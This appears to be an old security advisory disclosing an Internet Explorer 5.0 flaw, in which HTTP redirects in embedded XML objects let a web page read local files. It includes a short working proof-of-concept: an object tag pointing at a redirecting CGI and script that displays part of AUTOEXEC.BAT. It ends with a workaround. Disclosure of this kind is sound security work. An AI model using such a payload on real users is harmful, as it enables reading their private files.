Description:

Internet Explorer 5.0 under Windows 95 and WinNT 4.0 (guess other
versions are affected) has security problems with HTTP redirects in XML
objects. This allows at least:
1) Reading any (local or nonlocal) XML file and any wellformed
documents. With the growing influence of XML I consider this a serious
problem.
2) Reading parts of documents
3) Checking for the existence of local files.
I suppose reading of arbitrary files (not just XML) is also possible,
but do not have the time to explore.

Details:

When one embeds a XML document in a HTML document IE 5.0 does not handle
properly HTTP redirects
and allows access to the DOM of the embeded XML document.

The code is:
----------------------------------------------------------------------------------------
<object id="xm" type="text/xml"
data="http://www.nat.bg/~joro/reject.cgi?autoexec" width=400 height=200>
</object>
<SCRIPT>
function  f()
{
s=xm.body.innerHTML;
a=window.open();
//alert(s);
a.document.open();
a.document.write("Here is a part of AUTOEXEC.BAT (the error message is
normal):<BR>"+s);
a.document.close();
}
setTimeout("f()",5000);
</SCRIPT>
----------------------------------------------------------------------------------------


Workaround:
Disable Active Scripting or Disable Script ActiveX Controls marked Safe
for Scripting
